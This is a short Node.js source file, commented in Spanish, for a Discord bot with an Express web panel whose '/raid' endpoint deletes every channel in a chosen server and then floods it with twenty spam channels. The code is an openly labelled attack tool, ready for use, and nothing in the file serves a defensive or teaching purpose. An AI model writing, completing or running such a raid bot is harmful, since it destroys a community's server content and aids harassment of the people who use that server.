const { Client, GatewayIntentBits, PermissionsBitField } = require('discord.js');
const express = require('express');
const cors = require('cors');
const app = express();

app.use(cors());

const client = new Client({ 
    intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages] 
});

// Función para el "Raid"
app.get('/raid', async (req, res) => {
    const { guildId, channelName } = req.query;
    const guild = client.guilds.cache.get(guildId);

    if (!guild) return res.status(404).send('Servidor no encontrado');

    try {
        // 1. Borrar todos los canales (con cuidado)
        const channels = await guild.channels.fetch();
        for (const channel of channels.values()) {
            await channel.delete().catch(e => console.log("No pude borrar uno"));
        }

        // 2. Crear un chingo de canales
        for (let i = 0; i < 20; i++) { // Empezamos con 20 para no quemar el bot
            await guild.channels.create({
                name: channelName || 'koda-raid',
                type: 0 // Canal de texto
            });
        }
        res.send('Raid iniciado con éxito');
    } catch (error) {
        res.status(500).send('Error en el ataque');
    }
});

client.login(process.env.DISCORD_TOKEN);
app.listen(process.env.PORT || 3000, () => console.log('Panel Pro Listo'));